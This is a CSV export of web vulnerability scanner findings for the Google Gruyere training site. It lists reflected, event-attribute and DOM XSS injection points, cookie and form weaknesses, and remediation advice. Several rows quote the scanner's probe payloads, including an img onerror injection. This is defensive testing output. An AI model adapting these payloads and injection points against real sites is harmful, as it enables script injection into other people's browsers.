asset.id,asset.name,"definition.cvss2.base_score","definition.cvss2.base_vector","definition.cvss3.base_score","definition.cvss3.base_vector",definition.description,definition.family,definition.id,definition.name,"definition.patch_published","definition.plugin_published","definition.plugin_updated",definition.references,definition.see_also,definition.severity,definition.solution,"definition.vulnerability_published",finding_id,first_observed,last_observed,output,risk_modified,severity,state
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner identified some responses with a status code other than the usual 200 (OK), 301 (Moved Permanently), 302 (Found) and 404 (Not Found) codes. These codes can provide useful insights into the behavior of the web application and identify any unexpected responses to be addressed.","Web Applications",98050,"Interesting response",,2017-03-31T00:00:00Z,2021-06-14T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html, https://en.wikipedia.org/wiki/List_of_HTTP_status_codes",Info,,,"081c279d-5eb2-4826-8b88-920431d06fdc",2022-03-15T21:06:17.432Z,2022-03-15T13:36:05Z,"A response has been received with a response code '405' which may require further investigation to verify if this response is due to an abnormal behavior of the target.

The response has been triggered by an HTTP TRACE request made on the URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/'.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner identified some responses with a status code other than the usual 200 (OK), 301 (Moved Permanently), 302 (Found) and 404 (Not Found) codes. These codes can provide useful insights into the behavior of the web application and identify any unexpected responses to be addressed.","Web Applications",98050,"Interesting response",,2017-03-31T00:00:00Z,2021-06-14T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html, https://en.wikipedia.org/wiki/List_of_HTTP_status_codes",Info,,,"09474a38-0bec-4d33-bd6a-86a8e33731f5",2022-03-15T21:06:17.432Z,2022-03-15T13:36:05Z,"A response has been received with a response code '400' which may require further investigation to verify if this response is due to an abnormal behavior of the target.

The response has been triggered by an HTTP GET request made on the URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/snippets.gtl'.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"0960a027-6da8-4dfa-865b-353e11439510",2022-03-15T21:06:17.432Z,2022-03-15T14:24:53Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/newsnippet.gtl' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","The HttpOnly flag assists in the prevention of client side-scripts (such as JavaScript) from accessing and using the cookie.

This can help prevent XSS attacks from targeting the cookies holding the client's session token (setting the HttpOnly flag does not prevent, nor safeguard against XSS vulnerabilities themselves).","Web Applications",98063,"Cookie Without HttpOnly Flag Detected",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[], owasp_2010=[A9], owasp_2013=[A6], owasp_2017=[A3], owasp_2021=[A5], cwe=[1004], cve=[], cpe=[], wasc=[Application Misconfiguration], bid=[]","https://www.owasp.org/index.php/HttpOnly",Low,"The initial step to remedy this would be to determine whether any client-side scripts (such as JavaScript) need to access the cookie and if not, set the HttpOnly flag.
It should be noted that some older browsers are not compatible with the HttpOnly flag; therefore, setting this flag will not protect those clients against this form of attack.",,"09a5111e-5568-438c-8e4d-55a702926e44",2022-03-15T21:06:17.432Z,2022-03-15T16:41:46Z,"The scanner detected a cookie named 'GRUYERE' that does not set the HttpOnly flag.",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"0a24f3e3-7b26-4639-ad59-ba9c707f34cb",2022-03-15T21:06:17.432Z,2022-03-15T15:30:32Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/563265819128830739647592760263700851280/login' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"An error or warning message has been found on the remote web server. It may be possible for an attacker to view sensitive information and conduct further attacks.","Data Exposure",98611,"Error Message",,2019-05-26T00:00:00Z,2019-05-26T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","https://www.owasp.org/index.php/Error_Handling",Info,"Disable all notice, warning and error displaying. Configure the application to log such messages in a file.",,"0aa12d86-6230-45db-b713-a79fc60ab11b",2022-03-15T18:42:41.743Z,2022-03-15T18:04:15Z,"On https://google-gruyere.appspot.com/ debug error messages were detected. Please see the attached response for full details.
<b>WARNING:</b> Accessing or attacking a computer system without authorization is illegal in many jurisdictions. While doing this codelab",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","In typical form-based web applications, it is common practice for developers to allow `autocomplete` within the HTML form to improve the usability of the page. With `autocomplete` enabled (default), the browser is allowed to cache previously entered form values.

For legitimate purposes, this allows the user to quickly re-enter the same data when completing the form multiple times.

When `autocomplete` is enabled on either/both the username and password fields, this could allow a cyber-criminal with access to the victim's computer the ability to have the victim's credentials automatically entered as the cyber-criminal visits the affected page.

Scanner has discovered that the affected page contains a form containing a password field that has not disabled `autocomplete`.","Authentication & Session",98081,"Password Field With Auto-Complete",,2017-03-31T00:00:00Z,2022-03-03T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A6], owasp_2013=[A5], owasp_2017=[A6], owasp_2021=[A5], cwe=[16], cve=[], cpe=[], wasc=[Application Misconfiguration], bid=[]","https://www.owasp.org/index.php/Testing_for_Vulnerable_Remember_Password_(OTG-AUTHN-005)",Low,"The `autocomplete` value can be configured in two different locations.
The first and most secure location is to disable the `autocomplete` attribute on the `<form>` HTML tag. This will disable `autocomplete` for all inputs within that form. An example of disabling `autocomplete` within the form tag is `<form autocomplete=off>`.
The second slightly less desirable option is to disable the `autocomplete` attribute for a specific `<input>` HTML tag. While this may be the less desired solution from a security perspective, it may be preferred method for usability reasons, depending on size of the form. An example of disabling the `autocomplete` attribute within a password input tag is `<input type=password autocomplete=off>`.",,"0c404afb-b8fd-4dc3-a4bd-183f3e2e9efe",2022-03-15T21:06:17.432Z,2022-03-15T19:01:48Z,"The following form has been found to have not restricted Password Auto Complete:

<form method=""get"" action=""/563265819128830739647592760263700851280/saveprofile"">
  <input type=""hidden"" name=""action"" value=""update"">
  </input>
  <input type=""text"" value="""" name=""name"" maxlength=""16"">
  </input>
  <input type=""password"" name=""oldpw"">
  </input>
  <input type=""password"" name=""pw"">
  </input>
  <input type=""text"" value="""" name=""icon"">
  </input>
  <input type=""text"" size=""50"" value="""" name=""web_site"">
  </input>
  <input type=""text"" value="""" name=""color"">
  </input>
  <textarea name=""private_snippet"" rows=""10"" style=""width:100%"">
  </textarea>
  <input type=""submit"" value=""Update"">
  </input>
</form>
",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner has detected the presence of a form during the crawling of the target web application. Details about the form are provided in the plugin output.","Web Applications",98148,"Form Detected",,2021-10-21T00:00:00Z,2021-10-21T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"0e10bffd-bf73-48b9-b2a2-0e745ebf854b",2022-03-15T18:42:41.743Z,2022-03-15T17:38:44Z,"A form with no identifier has been detected on the following URL http://google-gruyere.appspot.com/361357029172560933265350706939995878846/editprofile.gtl with input fields : 
- private_snippet (no type specified)
- action (hidden)
- name (text)
- oldpw (password)
- pw (password)
- icon (text)
- web_site (text)
- color (text)

This form is submitted by using the following action : http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"102140eb-0db6-4fa0-a0f2-8bd62325bb6f",2022-03-15T21:06:17.432Z,2022-03-15T13:38:31Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/feed.gtl' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Unlike traditional Cross-Site Scripting (XSS), where the client is able to inject scripts into a request and have the server return the script to the client, DOM XSS does not require that a request be sent to the server and may be abused entirely within the loaded page.

This occurs when elements of the DOM (known as the sources) are able to be manipulated to contain untrusted data, which the client-side scripts (known as the sinks) use or execute an unsafe way.

Scanner has discovered that by inserting an HTML element into the page's DOM inputs (sources), it was possible to then have the HTML element rendered as part of the page by the sink.","Cross Site Scripting",98109,"DOM-based Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/DOM_Based_XSS, https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet",Medium,"Client-side document rewriting, redirection, or other sensitive action, using untrusted data, should be avoided wherever possible, as these may not be inspected by server side filtering.
To remedy DOM XSS vulnerabilities where these sensitive document actions must be used, it is essential to:
1. Ensure any untrusted data is treated as text, as opposed to being interpreted as code or mark-up within the page. 2. Escape untrusted data prior to being used within the page. Escaping methods will vary depending on where the untrusted data is being used. (See references for details.) 3. Use `document.createElement`, `element.setAttribute`, `element.appendChild`, etc. to build dynamic interfaces as opposed to HTML rendering methods such as `document.write`, `document.writeIn`, `element.innerHTML`, or `element.outerHTML `etc.",,"102792bf-c24f-4161-b18e-ec59f7bcc7be",2022-03-15T21:06:17.432Z,2022-03-15T13:37:38Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/snippets.gtl' by exploiting 'link' element named 'uid' and injecting following payload:

 | <img src=x onerror=window.top._tenable_wasscan_js_namespace_taint_tracer.log_execution_flow_sink() />",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner identified some responses with a status code other than the usual 200 (OK), 301 (Moved Permanently), 302 (Found) and 404 (Not Found) codes. These codes can provide useful insights into the behavior of the web application and identify any unexpected responses to be addressed.","Web Applications",98050,"Interesting response",,2017-03-31T00:00:00Z,2021-06-14T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html, https://en.wikipedia.org/wiki/List_of_HTTP_status_codes",Info,,,"116fe362-0967-4d1b-b1f3-866eadbe151d",2022-03-15T18:42:41.743Z,2022-03-15T16:48:46Z,"A response has been received with a response code '400' which may require further investigation to verify if this response is due to an abnormal behavior of the target.

The response has been triggered by an HTTP GET request made on the URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/login'.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"This is an informational notice that the scanner identified a potential login form that could be used by the scanner to authenticate and have access to additional pages for extending its coverage.","Authentication & Session",98033,"Login Form Detected",,2018-02-08T00:00:00Z,2018-02-08T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,"Edit scan policy and add login form authentication credentials to allow scanner to authenticate to the web application.",,"12c1b5a5-5616-4c2f-83d1-8f560305b499",2022-03-15T18:42:41.743Z,2022-03-15T16:50:16Z,"Potential login form has been identified in URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/login' with following fields:
- uid (TEXT)
- pw (PASSWORD)
To perform authenticated scan, configure your scan and add 'Login Form' authentication, with the URL associated to this plugin and as login parameters values for the above non-hidden fields.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into an HTML event attribute. For example `<div onmouseover=""x=INJECTION_HERE""</div>`, where `INJECTION_HERE` represents the location where the scanner payload was detected.","Cross Site Scripting",98108,"Cross-Site Scripting (XSS) in event tag of HTML element",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"1440a7e1-3322-458a-8c7c-04e51cf58022",2022-03-15T21:06:17.432Z,2022-03-15T13:35:04Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/snippets.gtl' by exploiting 'link' element named 'uid' and injecting following payload:

 |  script:;tenable_wasscan_xss_in_element_event=c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd//

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | _refreshsnippets(""361357029172560933265350706939995878846"", ""cheddar script:;tenable_wasscan_xss_in_element_event=c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd//"")

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
